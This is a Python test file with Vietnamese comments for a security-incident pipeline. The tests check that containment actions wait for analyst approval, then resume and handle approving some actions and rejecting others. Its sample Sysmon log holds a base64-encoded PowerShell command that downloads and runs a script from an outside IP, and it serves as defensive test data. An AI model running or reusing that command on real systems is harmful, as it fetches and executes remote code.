# -*- coding: utf-8 -*-
"""
tests/test_hitl_default_safety.py
Kiểm thử chuyên biệt cho cơ chế An toàn Mặc định (Safety-by-Default / Fail-Closed):
Human-In-The-Loop (HITL) bắt buộc dừng duyệt và không tự động thực thi hành động ngăn chặn.
"""

import unittest
import json
from datetime import datetime, timezone

from src.core.schemas import (
    IncidentStatus,
    SeverityLevel,
    ActionType,
    RawLogInput,
    RecommendedAction,
)
from src.core.state import IncidentState
from src.core.hitl_manager import (
    HITLManager,
    HITLDecision,
    DecisionType,
)
from src.core.orchestrator import (
    StateGraphOrchestrator,
    create_full_soc_pipeline,
    END,
)


class TestHITLDefaultSafety(unittest.TestCase):
    """Bộ kiểm thử kiểm chứng tính an toàn của cơ chế HITL khi tắt auto_approve."""

    def setUp(self):
        """Khởi tạo log tấn công mẫu và manager."""
        self.hitl_manager = HITLManager()
        self.malicious_payload = json.dumps({
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Computer": "FINANCE-PC-01",
            "User": "FINANCE\\victim_user",
            "DestinationIp": "194.26.29.112",
            "DestinationPort": 443,
        })
        self.initial_state = IncidentState(
            incident_id="INC-HITL-SAFETY-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=self.malicious_payload)]
        )

    def test_invoke_halts_at_hitl_approval_under_safe_mode(self):
        """
        Kiểm chứng 1: Với cấu hình mặc định (auto_approve=False), hàm invoke() PHẢI tạm dừng tại hitl_approval,
        chuyển status thành AWAITING_APPROVAL, và TUYỆT ĐỐI KHÔNG tự động nhảy sang reporting.
        """
        orchestrator = StateGraphOrchestrator(
            hitl_manager=self.hitl_manager,
            auto_approve=False
        )

        state = orchestrator.invoke(self.initial_state)

        # 1. Trạng thái phải dừng ở AWAITING_APPROVAL
        self.assertEqual(
            state.status,
            IncidentStatus.AWAITING_APPROVAL,
            "Pipeline phải dừng ở AWAITING_APPROVAL thay vì tự ý kết thúc RESOLVED"
        )

        # 2. Báo cáo cuối cùng chưa được xuất bản vì chưa có người duyệt
        self.assertIsNone(
            state.final_report,
            "Không được phép sinh Final Incident Report khi chưa có phê duyệt từ chuyên viên SOC"
        )

        # 3. Chuyên viên chưa duyệt
        self.assertIsNone(
            state.analyst_approved,
            "Trạng thái analyst_approved phải là None khi đang chờ duyệt"
        )

        # 4. Kiểm tra lịch sử chuyển đổi node cuối cùng là hitl_approval
        self.assertGreaterEqual(len(state.history), 1)
        last_transition = state.history[-1]
        self.assertEqual(last_transition.node, "hitl_approval")
        self.assertEqual(last_transition.to_status, IncidentStatus.AWAITING_APPROVAL)

    def test_actions_require_approval_remain_unapproved_none(self):
        """
        Kiểm chứng 2: Toàn bộ hành động có require_human_approval=True
        PHẢI giữ nguyên is_approved = None, không bị chuyển trái phép thành True.
        """
        orchestrator = StateGraphOrchestrator(
            hitl_manager=self.hitl_manager,
            auto_approve=False
        )

        state = orchestrator.invoke(self.initial_state)

        # Lấy danh sách hành động đề xuất từ Response Node
        self.assertGreater(
            len(state.recommended_actions), 0,
            "Response node phải đề xuất ít nhất một hành động ngăn chặn"
        )

        for action in state.recommended_actions:
            if action.require_human_approval:
                self.assertIsNone(
                    action.is_approved,
                    f"Hành động {action.action_id} ({action.action_type}) có require_human_approval=True "
                    f"nhưng bị tự động gán is_approved={action.is_approved}!"
                )

        # Kiểm tra qua HITLManager
        pending = self.hitl_manager.get_pending_actions(state)
        self.assertGreater(len(pending), 0, "Phải có ít nhất 1 hành động nằm trong danh sách pending_actions")
        self.assertFalse(self.hitl_manager.is_approval_complete(state))

    def test_execute_until_interrupt_pauses_correctly(self):
        """
        Kiểm chứng 3: execute_until_interrupt() trả về is_paused=True và state chờ duyệt.
        """
        orchestrator = StateGraphOrchestrator(
            hitl_manager=self.hitl_manager,
            auto_approve=False
        )

        is_paused, paused_state = orchestrator.execute_until_interrupt(self.initial_state)

        self.assertTrue(is_paused, "execute_until_interrupt phải trả về is_paused=True")
        self.assertEqual(paused_state.status, IncidentStatus.AWAITING_APPROVAL)
        self.assertIsNone(paused_state.final_report)

        # Xác nhận các hành động chờ duyệt
        pending = self.hitl_manager.get_pending_actions(paused_state)
        self.assertEqual(
            len(pending),
            len([a for a in paused_state.recommended_actions if a.require_human_approval and a.is_approved is None])
        )

    def test_resume_after_hitl_approves_and_completes_to_reporting(self):
        """
        Kiểm chứng 4: Chỉ sau khi gọi resume_after_hitl() thì hành động mới được duyệt
        và pipeline mới hoàn tất sang Node reporting (RESOLVED).
        """
        orchestrator = StateGraphOrchestrator(
            hitl_manager=self.hitl_manager,
            auto_approve=False
        )

        # Bước 1: Chạy tới điểm ngắt
        is_paused, paused_state = orchestrator.execute_until_interrupt(self.initial_state)
        self.assertTrue(is_paused)

        # Bước 2: Chuyên viên can thiệp phê duyệt qua resume_after_hitl
        final_state = orchestrator.resume_after_hitl(
            paused_state,
            analyst_approved=True,
            analyst_feedback="Chuyên viên SOC Senior phê duyệt phương án cách ly mạng"
        )

        # Bước 3: Xác minh trạng thái sau khi resume
        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)
        self.assertTrue(final_state.analyst_approved)
        self.assertIn("cách ly mạng", final_state.analyst_feedback)

        # Toàn bộ hành động đã được duyệt thi hành
        for action in final_state.recommended_actions:
            self.assertTrue(
                action.is_approved,
                f"Hành động {action.action_id} phải được chuyển sang is_approved=True sau khi duyệt"
            )

        # Báo cáo cuối cùng đã được sinh thành công
        self.assertIsNotNone(final_state.final_report)
        self.assertEqual(
            len(final_state.final_report.action_plan),
            len(final_state.recommended_actions)
        )

    def test_hitl_manager_approve_all_and_resume_from_interrupt(self):
        """
        Kiểm chứng 5: Chuyên viên sử dụng hitl_manager.approve_all() và tiếp tục
        thực thi bằng resume_from_interrupt().
        """
        orchestrator = StateGraphOrchestrator(
            hitl_manager=self.hitl_manager,
            auto_approve=False
        )

        is_paused, paused_state = orchestrator.execute_until_interrupt(self.initial_state)
        self.assertTrue(is_paused)

        # 1. Thực hiện approve_all thông qua hitl_manager
        approved_state = self.hitl_manager.approve_all(
            paused_state,
            analyst_id="soc_analyst_nam",
            notes="Đồng ý thực hiện toàn bộ khuyến nghị cách ly và chặn IP"
        )

        self.assertTrue(self.hitl_manager.is_approval_complete(approved_state))
        self.assertEqual(approved_state.status, IncidentStatus.CONTAINED)

        # 2. Resume pipeline từ điểm ngắt
        final_state = orchestrator.resume_from_interrupt(approved_state)

        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)
        self.assertIsNotNone(final_state.final_report)
        self.assertEqual(final_state.final_report.report_id, f"REP-{self.initial_state.incident_id}")

    def test_granular_decisions_via_submit_decision(self):
        """
        Kiểm chứng 6: Phê duyệt từng phần (Selective Approval) - Duyệt 1 hành động,
        từ chối 1 hành động, đảm bảo trạng thái phản ánh chính xác trong Final Report.
        """
        orchestrator = StateGraphOrchestrator(
            hitl_manager=self.hitl_manager,
            auto_approve=False
        )

        is_paused, paused_state = orchestrator.execute_until_interrupt(self.initial_state)
        self.assertTrue(is_paused)

        pending = self.hitl_manager.get_pending_actions(paused_state)
        self.assertGreaterEqual(len(pending), 2, "Cần tối thiểu 2 hành động để kiểm thử phê duyệt chọn lọc")

        # Duyệt hành động 1 (vd: ISOLATE_HOST)
        dec1 = HITLDecision(
            decision_type=DecisionType.APPROVE,
            action_id=pending[0].action_id,
            analyst_id="soc_lead_01",
            feedback_notes="Chấp thuận cô lập máy trạm"
        )
        self.hitl_manager.submit_decision(paused_state, dec1)

        # Từ chối hành động 2 (vd: BLOCK_IP)
        dec2 = HITLDecision(
            decision_type=DecisionType.REJECT,
            action_id=pending[1].action_id,
            analyst_id="soc_lead_01",
            feedback_notes="Không chặn IP này do đây là DNS nội bộ"
        )
        self.hitl_manager.submit_decision(paused_state, dec2)

        # Đã duyệt hết các pending actions
        self.assertTrue(self.hitl_manager.is_approval_complete(paused_state))

        # Tiếp tục pipeline
        final_state = orchestrator.resume_from_interrupt(paused_state)

        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)
        act1 = next(a for a in final_state.recommended_actions if a.action_id == pending[0].action_id)
        act2 = next(a for a in final_state.recommended_actions if a.action_id == pending[1].action_id)

        self.assertTrue(act1.is_approved)
        self.assertFalse(act2.is_approved)


if __name__ == "__main__":
    unittest.main()
